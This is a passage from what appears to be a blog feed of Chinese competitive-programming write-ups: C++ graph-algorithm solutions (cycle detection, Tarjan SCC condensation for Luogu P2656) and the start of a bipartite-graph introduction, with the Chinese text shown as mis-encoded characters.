class="comment">//å¯ä»¥çœ‹åˆ°ä»…ä»…é™åˆ¶æ¡ä»¶v!=preæ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚</span></span><br><span class="line">        <span class="keyword">int</span> tmp=<span class="built_in">dfs</span>(v,u);</span><br><span class="line">        <span class="keyword">if</span>(tmp)&#123;<span class="comment">//è‹¥è¿”å›ç»“æœä¸ä¸º0åˆ™è¯´æ˜é‡åˆ°ç¯ï¼Œå¹¶ä¸”æœ¬ç‚¹ä¹Ÿåœ¨æ¢ä¸Šï¼Œå°±ä¿å­˜ã€‚</span></span><br><span class="line">            value=tmp;</span><br><span class="line">            <span class="keyword">if</span>(value==u)&#123;</span><br><span class="line">                <span class="comment">//æˆ‘åˆ¤æ–­å‡ºç¯çš„é‚£ä¸ªç‚¹ä¸€å®šæ˜¯ç¯çš„èµ·ç‚¹ï¼Œå¦‚æœå›æº¯è¿‡ç¨‹ä¸­é‡åˆ°äº†è¯´æ˜ç¯å·²ç»ä¿å­˜å®Œäº†</span></span><br><span class="line">                <span class="comment">//å†å¾€å‰å›æº¯çš„ç‚¹å°±ä¸å±äºç¯äº†</span></span><br><span class="line">                value=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s.<span class="built_in">push_back</span>(u);</span><br><span class="line">            in_stack[u]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs2</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre,<span class="keyword">int</span> flag)</span></span>&#123;<span class="comment">//è¿™é‡Œæœç´¢ç¯çš„å­æ ‘ï¼Œå°†å­æ ‘ä¸Šæ‰€æœ‰ç‚¹æ ‡è®°ä¸ºå­æ ‘ä¸ç¯ç›´æ¥ç›¸è¿çš„ä¸€ä¸ªç‚¹</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line">        <span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//è¿™é‡Œæˆ‘ä»¬æ’é™¤ç¯ä¸Šçš„ç‚¹éå†çš„ä¸€å®šå°±éƒ½æ˜¯å­æ ‘</span></span><br><span class="line">        ans[v]=flag;<span class="comment">//ansä¿å­˜æœ¬ç‚¹ç­”æ¡ˆä¸å“ªä¸ªç‚¹çš„ç­”æ¡ˆä¸€è‡´ã€‚</span></span><br><span class="line">        <span class="built_in">dfs2</span>(v,u,flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w,p;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w,p);</span><br><span class="line">        sum_len+=w;<span class="comment">//è¯»å…¥è¾¹ï¼Œå°†è¾¹æƒä¹‹å’Œä¿å­˜ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">sort</span>(edge[i].<span class="built_in">begin</span>(),edge[i].<span class="built_in">end</span>(),cmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;<span class="comment">//ç»™å­æ ‘æ ‡è®°</span></span><br><span class="line">        <span class="built_in">dfs2</span>(*i,<span class="number">0</span>,*i);</span><br><span class="line">        ans[*i]=*i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> j=edge[*i].<span class="built_in">end</span>()<span class="number">-1</span>;j!=edge[*i].<span class="built_in">begin</span>()<span class="number">-1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_stack[j-&gt;to])&#123;<span class="comment">//å› ä¸ºæˆ‘ä»¬æ˜¯æŒ‰ç…§ç¾è§‚åº¦ä»å¤§åˆ°å°æ’åºçš„ï¼Œæ‰€ä»¥ä»åé¢å¼€å§‹æ‰¾åˆ°ç¬¬ä¸€ä¸ªåœ¨ç¯ä¸Šçš„ç‚¹ä¸€å®šæ˜¯ç¾è§‚åº¦è¾ƒå°çš„è¾¹ï¼Œç­”æ¡ˆå°±æ˜¯å‡å»ç¾è§‚åº¦è¾ƒå°çš„è¾¹æƒã€‚</span></span><br><span class="line">                res[*i]=sum_len-(j-&gt;w);<span class="comment">//resæ•°ç»„ä¿å­˜ç­”æ¡ˆ</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res[ans[i]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> åŸºç¯æ ‘ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·P2656é¢˜è§£</title>
      <link href="/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P2656">æ´›è°·P2656</a>é¢˜è§£ã€‚</p><span id="more"></span><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>å°èƒ–å’Œ ZYR è¦å» ESQMS æ£®æ—é‡‡è˜‘è‡ã€‚</p><p>ESQMS æ£®æ—é—´æœ‰ Nä¸ªå°æ ‘ä¸›ï¼ŒM æ¡å°å¾„ï¼Œæ¯æ¡å°å¾„éƒ½æ˜¯å•å‘çš„ï¼Œè¿æ¥ä¸¤ä¸ªå°æ ‘ä¸›ï¼Œä¸Šé¢éƒ½æœ‰ä¸€å®šæ•°é‡çš„è˜‘è‡ã€‚å°èƒ–å’Œ ZYR ç»è¿‡æŸæ¡å°å¾„ä¸€æ¬¡ï¼Œå¯ä»¥é‡‡èµ°è¿™æ¡è·¯ä¸Šæ‰€æœ‰çš„è˜‘è‡ã€‚ç”±äº ESQMS æ£®æ—æ˜¯ä¸€ç‰‡ç¥å¥‡çš„æ²ƒåœŸï¼Œæ‰€ä»¥ä¸€æ¡è·¯ä¸Šçš„è˜‘è‡è¢«é‡‡è¿‡åï¼Œåˆä¼šé•¿å‡ºä¸€äº›æ–°çš„è˜‘è‡ï¼Œæ•°é‡ä¸ºåŸæ¥è˜‘è‡çš„æ•°é‡ä¹˜ä¸Šè¿™æ¡è·¯çš„â€œæ¢å¤ç³»æ•°â€ï¼Œå†ä¸‹å–æ•´ã€‚</p><p>æ¯”å¦‚ï¼Œä¸€æ¡è·¯ä¸Šæœ‰ 4ä¸ªè˜‘è‡ï¼Œè¿™æ¡è·¯çš„â€œæ¢å¤ç³»æ•°â€ä¸º 0.70ï¼Œåˆ™ç¬¬ä¸€~å››æ¬¡ç»è¿‡è¿™æ¡è·¯å¾„æ‰€èƒ½é‡‡åˆ°çš„è˜‘è‡æ•°é‡åˆ†åˆ«ä¸º 4,2,1,0ã€‚</p><p>ç°åœ¨ï¼Œå°èƒ–å’Œ ZYR ä» Så·å°æ ‘ä¸›å‡ºå‘ï¼Œæ±‚ä»–ä»¬æœ€å¤šèƒ½é‡‡åˆ°å¤šå°‘è˜‘è‡ã€‚</p><hr><p>å°±æ˜¯æ²¿çº¿é‡‡è˜‘è‡ï¼Œç„¶åç»™å®šèµ·ç‚¹ï¼Œæ²¡æœ‰ç»™ç»ˆç‚¹ï¼Œè˜‘è‡é‡‡å®Œåä¼šå¤æ´»ï¼Œå¤æ´»çš„ä¸ªæ•°ä¸ºä¸Šä¸€æ¬¡çš„ä¸ªæ•°Ã—æ¢å¤ç³»æ•°ã€‚è·¯æ˜¯å•å‘çš„ï¼Œé‚£ä¹ˆå¯ä»¥æ®æ­¤å»ºä¸€ä¸ªæœ‰å‘å›¾ã€‚å¦‚æœä¸€æ¡è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹åœ¨åŒä¸€ä¸ªå¼ºè¿é€šåˆ†é‡å†…çš„è¯ï¼Œé‚£ä¹ˆè¿™æ¡è¾¹æˆ‘å¯ä»¥ç»è¿‡æ— æ•°æ¬¡ï¼Œè¿™å¾ˆå®¹æ˜“è¯æ˜ã€‚ä½†æ˜¯å¦‚æœä¸€æ¡è¾¹çš„ä¸¤ä¸ªç‚¹ä¸åœ¨åŒä¸€ä¸ªå¼ºè¿é€šåˆ†é‡ï¼Œé‚£ä¹ˆæˆ‘åªèƒ½é‡‡ä¸€æ¬¡ä¸Šé¢çš„è˜‘è‡ã€‚å› ä¸ºé¢˜ç›®æ²¡æœ‰è§„å®šä¸èƒ½åå¤æ¨ªè·³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆtarjanç¼©ç‚¹ç„¶åæŠŠå†…éƒ¨çš„è¾¹æƒé›†ä¸­åˆ°ç‚¹ä¸Šï¼Œå†é›†ä¸­çš„æ—¶å€™åªéœ€è¦æ³¨æ„ä¸€å®šæ˜¯è¦Ã—ç³»æ•°ç´¯åŠ ä¸Šå»çš„ï¼Œå› ä¸ºæˆ‘èƒ½æ— æ•°æ¬¡ç»è¿‡ã€‚</p><p>ç¼©ç‚¹ä¹‹åå°±æ˜¯å¯¹DAGå¤„ç†ï¼Œæˆ‘çœ‹å¤§ä½¬ä»¬ç”¨çš„éƒ½æ˜¯æœ€çŸ­è·¯å¾„ç®—æ³•ï¼Œè¿™é‡Œèœé¸¡åªä¼šæ‹“æ‰‘æ’åºqwqã€‚</p><p>è¿™é‡Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œèµ·ç‚¹æ‰€åœ¨çš„å¼ºè¿é€šåˆ†é‡å¦‚æœå…¥è¯»ä¸ä¸º0é‚£ä¹ˆé‚£äº›è˜‘è‡æˆ‘æ˜¯é‡‡ä¸åˆ°çš„ã€‚å› æ­¤æˆ‘åœ¨è¿™é‡Œè®¾ç«‹ä¸€ä¸ªflagæ ‡è®°ï¼Œåœ¨æ‹“æ‰‘æ’åºçš„æ—¶å€™å¦‚æœflagä¸º0é‚£ä¹ˆæˆ‘åªæŠŠç‚¹å’Œè¾¹åˆ äº†ï¼Œä¸åšæ•°å€¼ä¸Šçš„å¤„ç†ã€‚ç„¶åæˆ‘å¯¹èµ·ç‚¹æ‰€åœ¨çš„å¼ºè¿é€šåˆ†é‡flagè®¾1ï¼Œç„¶åå¦‚æœflagä¸º1åˆ™ä¼šå‘åé¢çš„ç‚¹ä¼ é€’ã€‚</p><p>åœ¨å†™çŠ¶æ€è½¬ç§»æ–¹ç¨‹çš„æ—¶å€™æ³¨æ„è¦æŠŠè·¯ä¸Šçš„è˜‘è‡å’Œé‚£ä¸ªç‚¹çš„è˜‘è‡éƒ½åŠ ä¸Šã€‚</p><p>å¦‚æœè·¯å¾„ä¸Šçš„è˜‘è‡ä¸ºwï¼Œvå¼ºè¿é€šåˆ†é‡ä¸Šçš„è˜‘è‡æ•°ä¸º$amount[v]$ã€‚é‚£ä¹ˆ$u-&gt;v$çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹å°±åº”è¯¥æ˜¯</p><p>$ans[v]=max(ans[v],ans[u]+w+amount[v])$</p><p>æœ€åæ³¨æ„ä¸€ä¸ªï¼Œé‚£å°±æ˜¯ä¸€å®šè¦è®°ç€ä¸ç®¡æ€æ ·ç»™æœ€ç»ˆç»“æœèµ‹ä¸€ä¸ªåˆå§‹å€¼å°±æ˜¯èµ·ç‚¹æ‰€åœ¨å¼ºè¿é€šåˆ†é‡çš„è˜‘è‡æ•°é‡ï¼Œè¿™é‡Œå¡äº†ä¸€ä¸‹ã€‚</p><p>ä¸‹é¢ç»™å‡ºACä»£ç ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 80005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">float</span> p;</span><br><span class="line">&#125;edge[maxn*<span class="number">3</span>],e[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],visited[maxn],s[maxn],degree[maxn],num[maxn],amount[maxn],ans[maxn],flag[maxn],cnt,cnt2,tot,top,deep,n,m;</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;ss;<span class="comment">//æ‹“æ‰‘æ’åºç”¨çš„æ ˆ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//ä¸€å¼€å§‹çš„å»ºå›¾</span></span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    edge[cnt].p=p;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//å¼ºè¿é€šåˆ†é‡çš„å»ºå›¾</span></span><br><span class="line">    degree[y]++;</span><br><span class="line">    e[++cnt2].next=root2[x];</span><br><span class="line">    e[cnt2].to=y;</span><br><span class="line">    e[cnt2].w=w;</span><br><span class="line">    e[cnt2].p=p;</span><br><span class="line">    root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;<span class="comment">//tarjanæ¿å­</span></span><br><span class="line">    visited[u]=<span class="number">1</span>;</span><br><span class="line">    dfn[u]=low[u]=++deep;</span><br><span class="line">    s[++top]=u;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(v);</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(visited[v])&#123;</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dfn[u]==low[u])&#123;</span><br><span class="line">        visited[u]=<span class="number">0</span>;</span><br><span class="line">        num[u]=++tot;</span><br><span class="line">        <span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">            visited[s[top]]=<span class="number">0</span>;</span><br><span class="line">            num[s[top--]]=tot;</span><br><span class="line">        &#125;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x, y, w;</span><br><span class="line">        <span class="keyword">float</span> p;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> start;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=root[i];j;j=edge[j].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[j].to,w=edge[j].w;</span><br><span class="line">            <span class="keyword">float</span> p=edge[j].p;</span><br><span class="line">            <span class="keyword">if</span>(num[i]==num[v])&#123;<span class="comment">//åŒä¸€ä¸ªå¼ºè¿é€šåˆ†é‡å†…åˆ™æŠŠæ‰€æœ‰èƒ½äº§ç”Ÿçš„è˜‘è‡åŠ ä¸Š</span></span><br><span class="line">                <span class="keyword">while</span>(w!=<span class="number">0</span>)&#123;</span><br><span class="line">                    amount[num[i]]+=w;</span><br><span class="line">                    w=(<span class="keyword">int</span>)((p)*w);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">add2</span>(num[i],num[v],w,p);<span class="comment">//å¦åˆ™å»ºè¾¹</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!degree[i])ss.<span class="built_in">push</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    ans[num[start]]=amount[num[start]];</span><br><span class="line">    flag[num[start]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> res=ans[num[start]];<span class="comment">//resä¸€å®šèµ‹åˆå€¼ä¸è¦å¿˜äº†</span></span><br><span class="line">    <span class="keyword">while</span>(!ss.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=ss.<span class="built_in">top</span>();</span><br><span class="line">        ss.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root2[x];i;i=e[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">            degree[v]--;</span><br><span class="line">            <span class="keyword">if</span>(!degree[v])ss.<span class="built_in">push</span>(v);</span><br><span class="line">            <span class="keyword">if</span>(flag[x])&#123;</span><br><span class="line">                ans[v]=<span class="built_in">max</span>(ans[v],ans[x]+w+amount[v]);<span class="comment">//çŠ¶æ€è½¬ç§»æ–¹ç¨‹</span></span><br><span class="line">                res=<span class="built_in">max</span>(res,ans[v]);<span class="comment">//ä¿å­˜ç»“æœ</span></span><br><span class="line">                flag[v]=<span class="number">1</span>;<span class="comment">//flagå‘å‰ä¼ æ’­</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tot==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans[<span class="number">1</span>]);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,res);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> å¼ºè¿é€šåˆ†é‡ã€ç¼©ç‚¹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>äºŒåˆ†å›¾å…¥é—¨</title>
      <link href="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/"/>
      <url>/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>ç„¶åä»Šå¤©æ¥å­¦äºŒåˆ†å›¾ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹äºŒåˆ†å›¾çš„å®šä¹‰ã€‚</p><span id="more"></span><h2 id="äºŒåˆ†å›¾çš„å®šä¹‰"><a href="#äºŒåˆ†å›¾çš„å®šä¹‰" class="headerlink" title="äºŒåˆ†å›¾çš„å®šä¹‰"></a>äºŒåˆ†å›¾çš„å®šä¹‰</h2><p>é¦–å…ˆäºŒåˆ†å›¾å®ƒæ˜¯ä¸€ä¸ªå›¾(G)ï¼Œç”±ç‚¹é›†(V)å’Œè¾¹é›†(E)æ„æˆçš„é›†åˆï¼Œå³<code>G=(V,E)</code>ã€‚</p><p>é™¤æ­¤ä¹‹å¤–å®ƒè¿˜æ»¡è¶³ä¸€ä¸ªç‰¹ç‚¹ï¼Œè‹¥è¿™ä¸ªå›¾çš„ç‚¹é›†å­˜åœ¨ä¸€ä¸ª<strong>åˆ’åˆ†</strong><code>&#123;V1,V2&#125;</code>ä½¿å¾—ï¼Œä»»æ„çš„<code>e(i,j,w)âˆˆE</code>æ»¡è¶³å…³ç³»ï¼Œ<code>iâˆˆV1,jâˆˆV2</code>æˆ–è€…æ˜¯<code>iâˆˆV2,jâˆˆV1</code>ã€‚é‚£ä¹ˆè¿™ä¸ªå›¾å°±è¢«ç§°ä¸ºä¸€ä¸ªäºŒåˆ†å›¾ã€‚</p><p>ä»¥ä¸Šæ˜¯æ¯”è¾ƒæ•°å­¦çš„è¯´æ³•ï¼Œè€Œä¸”æ˜¯è‡ªå·±DIYçš„(ç‹—å¤´ã€‚é‚£è¯´äººè¯å°±æ˜¯è¯´ï¼Œå¦‚æœä½ èƒ½æ‰¾åˆ°ä¸€ä¸ªåˆç†çš„æ–¹å¼æŠŠç‚¹åˆ’æˆä¸¤ä¸ªéƒ¨åˆ†ï¼Œä½¿å¾—æ¯æ¡è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹å‡ä¸åŒæ—¶å±äºä¸€ä¸ªéƒ¨åˆ†ã€‚é‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ä¸ªäºŒåˆ†å›¾ã€‚åä¹‹ï¼Œå¦‚æœä¸å­˜åœ¨è¿™æ ·çš„åˆ’åˆ†æ»¡è¶³ä»¥ä¸Šç»“æœï¼Œé‚£ä¹ˆå®ƒå°±ä¸æ˜¯ä¸€ä¸ªäºŒåˆ†å›¾ã€‚</p><p>äºŒåˆ†å›¾çš„ä¸€ä¸ªç­‰ä»·å®šä¹‰æ˜¯ï¼šä¸å«æœ‰<strong>å«å¥‡æ•°æ¡è¾¹çš„ç¯</strong>çš„å›¾ã€‚</p><p>å¦‚æœè¯´äº†è¿™ä¹ˆå¤šè®©ä½ æ„Ÿè§‰åˆ°è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹éš¾ä»¥ç†è§£çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¢ä¸€ä¸ªæ€è·¯ï¼šå‡è®¾æŠŠäººæ¯”ä½œç‚¹ï¼ŒæŠŠç›¸çˆ±å…³ç³»æ¯”ä½œè¾¹ã€‚å‡è®¾è¿™ä¸ªäººç¾¤å†…æ²¡æœ‰èˆ”ç‹—(æ‹æƒ…éå•å‘)å’Œç”·é…®ï¼Œé‚£ä¹ˆå®ƒä»¬çš„å…³ç³»ç»„æˆçš„å›¾å°±ä¼šæ˜¯ä¸€ä¸ªäºŒåˆ†å›¾ã€‚æ—¶é—´ç®¡ç†å¤§å¸ˆ(ä¸€äººåŒæ—¶ä¸å¤šäºº)ä¸å½±å“å®ƒè¿˜æ˜¯ä¸€ä¸ªäºŒåˆ†å›¾çš„ï¼Œåªè¦æ²¡æœ‰åŒå°±è¡Œã€‚ä¸çŸ¥é“è¿™ä¸ªä¾‹å­æ˜¯å¦å¤ŸæŠ½è±¡ï¼Œæ›´æ˜“äºç†è§£ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚ä¸‹å›¾ï¼Œå®ƒæ˜¯ä¸æ˜¯ä¸€ä¸ªäºŒåˆ†å›¾ï¼Ÿ</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/1.png" 